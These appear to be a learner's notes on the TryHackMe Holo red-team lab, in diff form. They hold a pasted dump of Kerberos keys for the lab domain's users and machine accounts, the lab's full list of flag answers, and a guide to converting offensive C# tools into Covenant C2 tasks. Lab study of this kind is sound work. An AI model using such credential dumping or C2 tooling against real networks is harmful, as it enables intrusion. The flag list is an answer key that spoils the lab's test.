+holo.live\SRV-ADMIN:des-cbc-md5:fddad9fd409ddcc4
+holo.live\a-koronei:aes256-cts-hmac-sha1-96:1498fbb54d864d54b50c0ef27f7c75d0b26f8e44d546b149b63a4c2cf5198f72
+holo.live\a-koronei:aes128-cts-hmac-sha1-96:33e38225f564b0dae2d6aa11859bd70b
+holo.live\a-koronei:des-cbc-md5:622a160104ce4f61
+holo.live\a-fubukis:aes256-cts-hmac-sha1-96:1025b95ab43b87d6fc146aecc2e42002dbde7944a41a0efdb6548e339e432aad
+holo.live\a-fubukis:aes128-cts-hmac-sha1-96:2d697cee6970afe2cfa8d54fe9cc10de
+holo.live\a-fubukis:des-cbc-md5:34a7737a3826bc46
+holo.live\koronei:aes256-cts-hmac-sha1-96:a2c26e661a2b0392a81ed515310ae209ffd3df05cadcb4291e12dd486e59b7a5
+holo.live\koronei:aes128-cts-hmac-sha1-96:bc7cc1bbd9020e5e5db55a7bba27e60f
+holo.live\koronei:des-cbc-md5:5886d0b332d0912f
+holo.live\fubukis:aes256-cts-hmac-sha1-96:655b3ee48920125492c24a10aba714921b4b693c14f3be2ac2f75dac738b8206
+holo.live\fubukis:aes128-cts-hmac-sha1-96:fb3d7f32dc0adc00d4084ed775024a4c
+holo.live\fubukis:des-cbc-md5:4c6ef78f25c8c123
+holo.live\matsurin:aes256-cts-hmac-sha1-96:c71016f6f2720c7b508d5db54be0ce3bb2d09938a2466252f7ad5ec1c805e540
+holo.live\matsurin:aes128-cts-hmac-sha1-96:c4a00ba0ab90c047fb12d85161a20141
+holo.live\matsurin:des-cbc-md5:3ecb516e402f261f
+holo.live\mikos:aes256-cts-hmac-sha1-96:0ec6da8ecbad1f1a31d021f72a6179cf04d7cbd30f090e4416c1c00fcf56c576
+holo.live\mikos:aes128-cts-hmac-sha1-96:dbc7955699643c5581759a9376d8ebc2
+holo.live\mikos:des-cbc-md5:7f310d46928a4cfb
+holo.live\okayun:aes256-cts-hmac-sha1-96:a2acdc0ede10e68c420dcb4fd7e0dc2bd0abc53b4629f38c6a72014158a9d439
+holo.live\okayun:aes128-cts-hmac-sha1-96:6b4d09a80db019cf26ba3747e24dbbb0
+holo.live\okayun:des-cbc-md5:15ec8aa8515dc71c
+holo.live\watamet:aes256-cts-hmac-sha1-96:d53c4c5126f471d3de0808f0ae65c121c16391de50f5566eb2332b619cdaa039
+holo.live\watamet:aes128-cts-hmac-sha1-96:f5375d7cfc3b0ed94754ebecddd81a63
+holo.live\watamet:des-cbc-md5:1ad61c4c01e3bf68
+holo.live\gurag:aes256-cts-hmac-sha1-96:c98051602a306799e8d107bf72528208fd058d8005e5b8bbe071c0b8367fa497
+holo.live\gurag:aes128-cts-hmac-sha1-96:45db25bacadc2fc2248954c89e99de46
+holo.live\gurag:des-cbc-md5:cb37b0234c263146
+holo.live\cocok:aes256-cts-hmac-sha1-96:9033011a06460d2836cf260f5f7eaae63dc423f913b789c8ef69884082a5e8b2
+holo.live\cocok:aes128-cts-hmac-sha1-96:a6d5cab30210589b9171ca2f93e88993
+holo.live\cocok:des-cbc-md5:ab8a9be37af8c734
+holo.live\ameliaw:aes256-cts-hmac-sha1-96:f702d2d08531fba1296b4ffa3c31ddc217d119852830d943407b04a1784a0a56
+holo.live\ameliaw:aes128-cts-hmac-sha1-96:72c960233e6da31ce25b33c0094bc603
+holo.live\ameliaw:des-cbc-md5:e9d04cb53831fb5e
+holo.live\WEB-MGR:aes256-cts-hmac-sha1-96:2db3a719b9611b5f2aaada669e3f67fe44997b40c10c3f38f009ad6f31b93bc3
+holo.live\WEB-MGR:aes128-cts-hmac-sha1-96:4bbe92af844bf725b13970c5fa59a55a
+holo.live\WEB-MGR:des-cbc-md5:5d01d615f234e9d3
+MyNewUser:aes256-cts-hmac-sha1-96:96546a372ddd07179babd7527ba0f7c4e52cbf041ab37e4b1bba75539daa87c1
+MyNewUser:aes128-cts-hmac-sha1-96:d2c31de780c66bab4b721846b705b522
+MyNewUser:des-cbc-md5:dc6d1634643b0d29
+DC-SRV01$:aes256-cts-hmac-sha1-96:52b7605bba35b492e13d96d147e66a4ba335f8fc0f2b74173c3c98283e8937b4
+DC-SRV01$:aes128-cts-hmac-sha1-96:c6b08129506ccbe6dd0f40b57c3b7524
+DC-SRV01$:des-cbc-md5:5b1f86e068aecefe
+S-SRV01$:aes256-cts-hmac-sha1-96:212c4e4cd12d5ab16eca90a96680c271d55f47ba03ccbfe10e953d021fc52f5d
+S-SRV01$:aes128-cts-hmac-sha1-96:9d88e8534dd0e30c00e9da6c359ab5ae
+S-SRV01$:des-cbc-md5:a279cdf79792c40e
+PC-FILESRV01$:aes256-cts-hmac-sha1-96:13ede33286b99acf5d41a99ba95a5972ce3f5d18beb460171d20be67d1c5c53e
+PC-FILESRV01$:aes128-cts-hmac-sha1-96:546f72aa6631fccac202855e5f8958bd
+PC-FILESRV01$:des-cbc-md5:b3b034a254291c3d
+S-SRV02$:aes256-cts-hmac-sha1-96:dea3c06fbce7d15777cae708d2bb881d64995a731fdc422851b73a4be976561a
+S-SRV02$:aes128-cts-hmac-sha1-96:a0ca1f1f2db1f122b7b9a313fcc3d633
+S-SRV02$:des-cbc-md5:0b5d4032f4158f10
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+```
+![[Pasted image 20230207122937.png]]
+Read the above and weaponize the relay.
+Completed
+Submit flags from DC-SRV01 in Task 4.
+Completed
+### Conclusion End Game
+End Game
+After compromising DC-SRV01 and gaining Domain Admin/Enterprise Admin access, all thats left is to go and submit any remaining flags.
+Thank You
+Thank you to our wonderful testers, 0day, CMNatic, Legndery, NinjaJc01, Szmex73, Blackout, and TimTaylor for putting up with our two month long Beta, our constant back and forth about what needs to be fixed and anything and everything in between. We would not have been able to release the Network without you all. Thank you <3
+A special congratulations to Szymex73 for being the first tester to fully complete the Network. It was rough, but thank you.
+As always, a special thanks to Ashu, Ben and Jon for giving us the opportunity to create another Network and a shoutout to Bee, CMNatic, DancingRasta, Heavenraiza, Horshark and everyone else in TryHackMe's support staff.  We wouldn't be here without you, we appriciate all that you do.
+Lastly, Thank you for completing Holo. You all are the reason that we can continue to make Networks. If you enjoyed it, please let us know and let TryHackMe know. We love to see your feedback so we can make future networks better and more enjoyable for you.
+Love,
+[Cryillic](https://twitter.com/Real_Cryillic) and [Spooks](https://twitter.com/NaisuBanana)
+Answer the questions below
+Submit the rest of your flags and complete Holo
+Completed
+![[Pasted image 20230207125447.png]]
+
+## Flags / Answers
+- ![](https://tryhackme-images.s3.amazonaws.com/room-icons/79023e1ed4c207bc52b7dfee208c80a5.png)
+- _Use this task to submit all the flags found in the Holo Network._
+- Answer the questions below
+- What flag can be found inside of the container?
+- *HOLO{175d7322f8fc53392a417ccde356c3fe}*
+- What flag can be found after gaining user on L-SRV01?
+- *HOLO{3792d7d80c4dcabb8a533afddf06f666}*
+- What flag can be found after rooting L-SRV01?
+- *HOLO{e16581b01d445a05adb2e6d45eb373f7}*
+- What flag can be found on the Web Application on S-SRV01?
+- *HOLO{bcfe3bcb8e6897018c63fbec660ff238}*
+- What flag can be found after rooting S-SRV01?
+- *HOLO{50f9614809096ffe2d246e9dd21a76e1}*
+- What flag can be found after gaining user on PC-FILESRV01?
+- *HOLO{2cb097ab8c412d565ec3cab49c6b082e}*
+- What flag can be found after rooting PC-FILESRV01?
+- *HOLO{ee7e68a69829e56e1d5b4a73e7ffa5f0}*
+- What flag can be found after rooting DC-SRV01?
+- *HOLO{29d166d973477c6d8b00ae1649ce3a44}*
+### Pwning & Prizes
+- ![](https://i.imgur.com/KSnkv4e.png)
+- To celebrate the launch of Holo, we will be hosting a competition.
+- If you choose to participate, you will assume the role of a Red Teamer for a company called "Black Sun Security". You have been hired by a client, "Holo", to perform a Red Team Assessment on their Network. Your goal is to compromise the Domain Controller in the stealthiest means possible; you will get style points. Recent exploits like Zero Logon and Print Nightmare may work but are considered to be "Loud", "Potentially Destructive", and "Not Stealthy", you should avoid them at all costs.
+- The client has specified that you should be as verbose as possible in the report, but this should **not** be a writeup. They have also requested that you provide links to any resources (ex. Github Repositories, Code Snippets, Websites, Blogs, etc) relevant to your report. If you have never written a report before, it is highly recommended you check out the [Wreath Network](https://tryhackme.com/room/wreath) to help you out.
+- The deadline for the competition is September 15, 2021. Participants must email all reports to **reports@blacksunsecurity.com .** Please send this via an email that you regularly check. We will be contacting all the winners via email.
+- **Prizes:**
+-   One (1) - [PEN-300 Course Voucher](https://www.offensive-security.com/pen300-osep/) (Evasion Techniques and Breaching Defenses) by Offensive Security
+-   One (1) - [Throwback](https://tryhackme.com/room/throwback) Network Voucher
+-   Five (5) - TryHackMe One Month VIP Vouchers
+- **Important Notes:**
+- 1.  _TryHackMe will not be considered an acceptable source for the report. TryHackMe will be considered an "Internal Confidential Resource that is not allowed to be disclosed to the Client because it contains proprietary attack methodology"._
+- 2.  _You must be [18 years or older](https://help.offensive-security.com/hc/en-us/articles/360040158392-Is-there-a-minimum-age-requirement-for-taking-a-course-with-Offensive-Security-) to register for the Offensive Security PEN-300 Course._
+### CLR - Commonly Lacking Radiation
+- An integral part of working with Windows and other operating system implementations is understanding C# and its underlying technology, .NET. Many Windows applications and utilities are built in C# as it allows developers to interact with the CLR and Win32 API. We will cover the infrastructure behind .NET and its use cases within Windows further below.
+- ![](https://cdnlogo.com/logos/d/6/dot-net-core.svg)
+- .NET uses a run-time environment known as the Common Language Runtime (CLR). We can use any .NET language (C#, PowerShell, etc.) to compile into the Common Intermediary Language (CIL). NET also interfaces directly with Win32 and API calls making the optimal solution for Windows application development and offensive tool development.
+- From Microsoft, ".NET provides a run-time environment, called the common language runtime, that runs the code and provides services that make the development process easier. Compilers and tools expose the common language runtime's functionality and enable you to write code that benefits from this managed execution environment. Code that you develop with a language compiler that targets the runtime is called managed code. Managed code benefits from features such as cross-language integration, cross-language exception handling, enhanced security, versioning and deployment support, a simplified model for component interaction, and debugging and profiling services."
+- ---
+- .NET consists of two different branches with different purposes, outlined below.
+-   .NET Framework (Windows only)
+-   .NET Core (Cross-Compatible)
+- The main component of .NET is .NET assemblies. .NET assemblies are compiled .exes and .dlls that any .NET language can execute.
+- The CLR will compile the CIL into native machine code. You can find the flow of code within .NET below.
+- .NET Language → CIL/MSIL → CLR → machine code
+- You can also decide to use unmanaged code with .NET; code will be directly compiled from the language into machine code, skipping the CLR. Examples of unmanaged code are tools like Donut and UnmanagedPowerShell. Find a visual of data flow within both managed and unmanaged code below.
+- ![](https://i.imgur.com/ou1uYAu.png)
+- Within .NET, there also exists the Dynamic Language Runtime (DLR). This concept is out of scope for this network; however, to learn more about it, check out this article, [](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview)[https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview)
+- Now that we have a basic understanding of .NET and how it can interact with the system from .NET languages, we can begin developing and building offensive tooling to aid us in our operations.
+- Answer the questions below
+- Read the above and prepare to apply .NET theory with C#.
+```text
+- CLR (Common Language Runtime) is the execution engine of the .NET Framework. It provides a common runtime environment for all .NET languages, such as C# and VB.NET. It manages memory and thread allocation, garbage collection, and provides security and exception handling.
+
+Win32 API is a set of functions provided by the Windows operating system. These functions allow developers to interact with the underlying operating system and perform tasks such as creating and manipulating files, interacting with the registry, and creating and controlling windows. C# can call Win32 API functions through P/Invoke (Platform Invoke) mechanism.
+
+CLR (Common Language Runtime) and Win32 API (Application Programming Interface) are two different technologies that are used in Windows application development.
+
+The CLR is a runtime environment provided by .NET framework that runs .NET code, manages memory, and provides security. It enables cross-language integration and cross-language exception handling, meaning that code written in different programming languages can interact with each other and handle exceptions in a consistent manner.
+
+On the other hand, Win32 API is a set of functions and components provided by Microsoft to access and control the core functionality of Windows operating system. It allows developers to interact with the operating system and provides a low-level interface to perform various tasks such as creating windows, handling user input, and accessing system resources.
+
+In summary, CLR and Win32 API are both important technologies in Windows application development and they complement each other to provide a rich and powerful platform for developers.
+
+The .NET Language (such as C# or Visual Basic) is compiled into Common Intermediate Language (CIL) or Microsoft Intermediate Language (MSIL), which is then executed by the Common Language Runtime (CLR) in the .NET Framework. The CLR converts the CIL/MSIL code into machine code for execution by the computer's processor. This allows for cross-language integration and cross-language exception handling, as the code is compiled into a common intermediate language before being executed by the runtime.
+
+https://github.com/leechristensen/UnmanagedPowerShell
+https://www.youtube.com/watch?v=7tvfb9poTKg&ab_channel=RaphaelMudge
+
+The Dynamic Language Runtime (DLR) is a technology that enables the execution of dynamic programming languages such as Python and Ruby on the .NET platform. It provides an environment for dynamic languages to be executed in a similar way to statically-typed languages such as C# and Java.
+
+For example, consider a dynamic language like Python that is used to write scripts to automate tasks. Normally, Python code is executed directly by the Python interpreter, but with the DLR, the Python code can be executed on the .NET platform and take advantage of .NET libraries and services. This allows for better integration between dynamic languages and .NET, enabling developers to mix and match languages in a single application.
+```
+### .NET Basics Rage Against the Compiler
+- An important part of C# and building offensive tooling is understanding how to compile your tools and tools without pre-built releases. To work with C# and building tools, we will again utilize Visual Studio. It is important to note that Visual Studio is not the only C# compiler, and there are several other compilers outlined below.
+-   Roslyn
+-   GCC
+-   MinGW
+-   LLVM
+-   TCC
+-   MSBuild
+- In this task, we will be using Visual Studio as it is the easiest to comprehend and work with when developing in C#. Visual Studio also allows us to manage packages and .NET versions without headache when building from a solution file.
+- To build and develop C# in Visual Studio, we recommend using the Windows development virtual machine, [https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/](https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/).
+- To begin using Visual Studio, you will need a valid Microsoft/Outlook account to sign in and authenticate to Visual Studio. It is a simple and free process to create an account if you do not already have one. For more information, check out the Outlook page, [https://outlook.live.com/owa/](https://outlook.live.com/owa/).
+- We will begin our compiling journey by creating and building a solution file from the code we wrote in the previous task.
+- To create a solution file for .NET Core, navigate to _Create a new project > Console App (.NET Core)_. If you want to open a preexisting solution file/project, navigate to _Open a project or solution_.
+- From here, you can configure your project's Name, Location, and Solution Name. Find a screenshot of the configuration menu below.
+- ![](https://i.imgur.com/VuOvFfi.png)
+- Once created, Visual Studio will automatically add a starting C# hello world file and maintain the solution file for building. Find a screenshot of the file structure below.
+- ![](https://i.imgur.com/wlpOqPc.png)
+- You will notice that Visual Studio will break down the Dependencies, Classes, and Methods in this file tree which can be helpful when debugging or analyzing code.
+- From here, we should have a working, automatically generated C# hello world file that we can use to test our build process. To build a solution file, navigate to Build > Build Solution or hold Ctrl+Shift+B. You can also build from applications themselves rather than project solutions; however, that is out of scope for this network. Once run, the console tab should open or begin outputting information. From here, you can monitor the build process and any errors that may occur. If successful, it will output Build: 1 succeeded and the path to the compiled file. Find a screenshot of the build process below.
+- ![](https://i.imgur.com/6V2nVfe.png)
+- You should now have a successfully compiled file that you can run and use on other systems with corresponding .NET versions!
+- It is important to note that when building other developer's tools, they will often contain several dependencies and packages. Ensure the machine you are using to build the solution has access to the internet to retrieve the needed packages.
+- Answer the questions below
+- Read the above and practice creating and building Visual Studio solutions.
+- Completed
+- ![[Pasted image 20230130122437.png]]
+- ![](https://camo.githubusercontent.com/6209fb99bc6edcb2341900468f78b09f03d0be74e03b48e49beb87c52b55362c/68747470733a2f2f646f63732e676f6f676c652e636f6d2f64726177696e67732f642f317035335657787a474e667938726a722d6d5738707669734a6d686b6f4c6c383276416763744f5f366631772f7075623f773d39363026683d373230)
+
+## Notes / Lessons Learned
+A large part of operating with Covenant is task usage. Covenant, by default, does not come with a large number of tasks/modules to choose from like other C2 frameworks like Empire and PoshC2. This means that we will need to create our own tasks of tools that we want to use within Covenant. Luckily for us, Covenant is built off .NET and C#, making it easy to convert any C# code into a task.
+For this task, we will be converting SharpEDRChecker into a Covenant task; this will later be used in Task 36.
+Since Covenant v0.5, the way that the Covenant backend intakes and parses tasks has changed. Covenant now utilizes YAML files to define tasks and task data. From the YAML website, "YAML is a human-friendly data serialization standard for all programming languages." This makes it easy for developers and operators to weaponize and integrate tooling into Covenant.
+Find an outline below of rules you need to have in mind when building tasks to ensure that your task integrates with the grunt.
+-   Define a class called `Task`
+-   Define a method called `Execute`
+-   Return a string
+We will begin by using an example template that we can later modify and add references to. Find an example YAML template for Covenant below.
+```yaml
+- Name: Example
+  Aliases: []
+  Description: Example task for Covenant
+		Name: Tryhackme 
+		Handle: THM_User
+		Link: <https://twitter.com/RealTryHackMe>
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+	public static class Task {
+	    public static string Execute() {
+	        return "Hello Covenant!";
+	    }
+	}
+```
+The above is a basic template that we can use to get the basic structure of our task down. Find an explanation of each YAML tag below.
+-   `Name` Name of the task in Covenant UI.
+-   `Aliases` Aliases or shortcuts for the task.
+-   `Description` Description of the task in Covenant UI.
+-   `Language` Language the task source code is written in.
+-   `CompatibleDotNetVersions` Versions of .NET the source code will run on.
+-   `Code` Source code of task.
+We have a basic structure for our task data, but our task will still not work. Covenant uses .NET; we need to define our reference assemblies that .NET will use to interpret our code and provide basic functionality. Find an example YAML template for reference assemblies below.
+```yaml
+ReferenceAssemblies:
+    - Name: mscorlib.dll
+      Location: net35\\mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35\\System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35\\System.Core.dll
+      DotNetVersion: Net35
+	    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+```
+Depending on what project we are working on and what assemblies it uses will depend on how many and what reference assemblies we add to this template. For our example task, we will only need to add basic assemblies found in the template above.
+This method of adding reference assemblies can also be used to add reference sources; this is how we can add external C# code. We will be covering this in more depth later in this task.
+We can add together the above YAML to create a final example template that we can use to test our task source code. Find the YAML template below.
+```yaml
+- Name: Example
+  Aliases: []
+  Description: Example task for Covenant
+      Name: Tryhackme 
+      Handle: THM_User
+      Link: <https://twitter.com/RealTryHackMe>
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: |
+	public static class Task {
+	    public static string Execute() {
+	        return "Hello Covenant!";
+	    }
+	}
+TaskingType: Assembly
+UnsafeCompile: false
+TokenTask: false
+Options: []
+ReferenceAssemblies:
+	- Name: mscorlib.dll
+	Location: net35\\mscorlib.dll
+	DotNetVersion: Net35
+	- Name: System.dll
+	Location: net35\\System.dll
+	DotNetVersion: Net35
+	- Name: System.Core.dll
+	Location: net35\\System.Core.dll
+	DotNetVersion: Net35
+	- Name: mscorlib.dll
+	Location: net40/mscorlib.dll
+	DotNetVersion: Net40
+	- Name: System.dll
+	Location: net40/System.dll
+	DotNetVersion: Net40
+	- Name: System.Core.dll
+	Location: net40/System.Core.dll
+	DotNetVersion: Net40
+EmbeddedResources: []
+ReferenceAssemblies: []
+EmbeddedResources: []
+```
+You can add this YAML file under `Covenant/Covenant/Data/Tasks/`. If we rebuild and run Covenant, our newly created task should appear within the UI and can be used with any grunts now.
+Now that we have a basic task working, we can attempt to convert SharpEDRChecker to Covenant. This process is not as hard as it seems and is fully outlined below.
+First, we will want to place the entire SharpEDRChecker source code repository in `Covenant/Covenant/Data/ReferenceSourceLibraries/`. This will allow Covenants backend to integrate and parse the source code and references of the tool.
+You can also import PowerShell scripts or commands using the PowerShell and PowerShellImport tasks along with creating your own tasks.
+Answer the questions below
+Read the above and practice converting offensive tools to Covenant tasks.
+Completed
+[[Splunk 3]]
+
